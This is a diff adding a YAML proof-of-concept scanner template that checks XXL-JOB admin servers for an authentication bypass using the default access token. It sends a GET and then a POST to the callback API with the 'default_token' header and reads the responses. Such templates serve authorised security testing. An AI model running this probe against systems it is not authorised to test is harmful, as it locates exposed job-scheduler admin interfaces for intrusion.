@@ -1,0 +1,33 @@
+id: poc-yaml-xxl-job-defaule-accesstoken-bypass
+info:
+  name: XXL-JOB 默认 accessToken 身份绕过
+  severity: high
+  tags:
+  - 两高一弱
+  - 访问控制错误
+  finger: xxl-job
+variables:
+  path: '/xxl-job-admin/api/callback
+
+    /api/callback'
+requests:
+- method: GET
+  path: '{{.path}}'
+  expression: 'status_code == 200
+
+    && contains(body, "\"code\":500,\"msg")
+
+    && contains(body, "invalid request, HttpMethod not support.")
+
+    '
+- method: POST
+  path: '{{.path}}'
+  headers:
+    XXL-JOB-ACCESS-TOKEN: default_token
+  data: null
+  expression: 'status_code == 200
+
+    && contains(body, "{\"code\":200,")
+
+    '
+transport: http
